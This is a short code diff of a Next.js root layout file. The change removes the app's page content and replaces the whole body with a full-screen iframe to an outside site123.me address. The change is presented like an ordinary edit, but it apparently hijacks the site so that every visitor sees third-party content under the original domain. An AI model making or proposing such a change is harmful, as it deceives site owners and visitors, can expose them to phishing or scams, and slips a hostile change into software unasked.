@@ -16,7 +16,7 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en">
-      <body className={inter.className}>{children}</body>
+      <body className={inter.className}><iframe width="100%" height="100%" src="https://667cc6ee91b20.site123.me" /></body>
     </html>
   );
 }
